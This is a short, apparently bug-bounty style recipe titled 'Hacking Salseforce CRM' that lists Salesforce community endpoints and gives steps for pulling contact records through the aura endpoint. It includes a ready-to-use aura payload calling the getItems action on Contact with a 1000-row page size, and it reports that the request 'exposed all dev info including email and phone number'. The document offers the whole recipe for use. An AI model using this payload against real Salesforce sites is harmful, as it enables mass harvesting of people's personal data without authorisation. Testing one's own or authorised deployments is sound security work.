## Hacking Salseforce CRM

#### endpoints
+ /developer/s/login/
+ /developer/s/dp-register
+ /developer/s/SelfRegister
+ /developer/s/dp-register/custom-self-register
+ /s/sfsites/aura
+ /s/login/
+ /s/dp-register
+ /s/SelfRegister
+ /s/dp-register/custom-self-register

### information Disclosure 
1. Create user account on https://sub.target.com/
2. Complete to account verification process.
3. After login, visit the burp history and look for any  POST request having "/developer/s/sfsites/aura" or "/s/sfsites/aura" kind of request.
+ Payload
``
message={"actions":[{"id":"2;a","descriptor":"serviceComponent://ui.force.components.controllers.lists.selectableListDataProvider.SelectableListDataProviderController/ACTION$getItems","callingDescriptor":"UNKNOWN","params":{"entityNameOrId":"Contact","pageSize":1000,"currentPage":1,"getCount":true,"layoutType":"FULL","enableRowActions":true,"useTimeout":false}}]}
``
4. send it repeater
5. replace the message parameter with below payload.
5. send the request.

exposed all dev info  including email and phone number 
